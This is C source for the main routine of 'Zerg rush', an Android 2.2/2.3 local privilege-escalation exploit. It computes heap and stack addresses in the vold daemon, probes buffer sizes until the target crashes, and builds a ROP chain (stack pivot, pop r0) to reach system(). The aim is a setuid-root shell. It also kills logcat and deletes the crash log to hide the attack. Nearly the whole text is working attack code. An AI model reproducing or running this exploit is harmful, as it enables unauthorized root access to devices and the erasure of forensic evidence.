int main(int argc, char **argv, char **env)
{
	uint32_t i = 0, ok = 0;
	char *ash[] = {sh, 0};
	struct stat st;
	char version_release[256];
	int tries=0;

	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
		do_root();

	printf("\n[**] Zerg rush - Android 2.2/2.3 local root\n");
	printf("[**] (C) 2011 Revolutionary. All rights reserved.\n\n");
	printf("[**] Parts of code from Gingerbreak, (C) 2010-2011 The Android Exploid Crew.\n\n");

	if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
		die("[-] Cannot copy boomsh.");

	chmod(bsh, 0711);

	stat(vold, &st);
	heap_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000;

	__system_property_get("ro.build.version.release", version_release);
	
	if (strstr(version_release, "2.2")) {
		heap_addr += 0x108;
		printf("[+] Found a Froyo ! 0x%08x\n", heap_addr);
	} else if (strstr(version_release, "2.3")) {
		heap_addr += 0x118;
		printf("[+] Found a GingerBread ! 0x%08x\n", heap_addr);
	} else {
		printf("[-] Not a 2.2/2.3 Android ...\n");
		exit(-1);
	}

	system_ptr = (uint32_t) find_symbol("system");

	if (check_addr(system_ptr) == -1) {
		printf("[-] High templars, we're doomed!\n");
		exit(-1);
	}

	tries = 0;
	printf("[*] Scooting ...\n");
	while(buffsz=allbuffsz[tries]) {
		if(checkcrash()) {
			printf("[+] Zerglings found a way to enter ! 0x%02x\n", buffsz);
			break;
		}
		tries++;
	}

	if(!buffsz) {
		printf("[-] Hellions with BLUE flames !\n");
		exit(-1);
	}

	for (tries = 0; tries < 5; tries++) {
		find_stack_addr();

		if (stack_addr != 0x41414141 && jumpsz) {
			printf("[+] Zerglings caused crash (good news): 0x%08x 0x%04x\n", stack_addr, jumpsz);
			break;
		}

		printf("[*] Trying a new path ...\n");
		switch(tries) {
		case 0:
		case 2:
		case 4:
			heap_addr += 8;
			break;
		case 1:
			heap_addr += 0xb8;
			break;
		case 3:
			heap_addr -= 0x180;
			break;
		default:
			break;
		}
	}
	
	if (stack_addr == 0x41414141 || !jumpsz) {
		printf("[-] Zerglings did not leave interesting stuff\n");
		exit(-1);
	}
	
	if (check_addr(stack_addr) == -1) {
		printf("[-] Siege tanks, we're doomed!\n");
		exit(-1);
	}

	if (jumpsz > 108 + 12) {
		printf("[-] This terran has walled!\n");
		exit(-1);
	}
	
	kill(logcat_pid, SIGKILL);
	unlink(crashlog);

	printf("[*] Researching Metabolic Boost ...\n");
	find_rop_gadgets();
	printf("[+] Speedlings on the go ! 0x%08x 0x%08x\n", stack_pivot, pop_r0);

	for(i=0; i<3; i++) {
		do_fault();
		
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n[+] Rush did it ! It's a GG, man !\n");
			ok = 1;
			break;
		} else {
			printf("\n[-] Bad luck, our rush did not succeed :( (%d/%d)\n", i, 2);
			switch(i) {
			case 0:
				heap_addr += 16;
				break;
			case 1:
				heap_addr -=32;
				break;
			default:
				break;
			}
		}
	}

	if (ok) {
		char qemuprop[1];
		property_get("ro.kernel.qemu",qemuprop,"0");

		if (qemuprop[0]=='1') {
			printf("[+] Killing ADB and restarting as root... enjoy!\n");
			fflush(stdout);
			sleep(1);
			kill(-1,SIGTERM);
		} else {
			printf("[-] Failed to set property to restart adb. Not killing.\n");
		}
	} else {
		printf("Exiting. Try again later.\n");
		fflush(stdout);
		sleep(1);
		kill(-1,SIGTERM);
	}

	return 0;
}
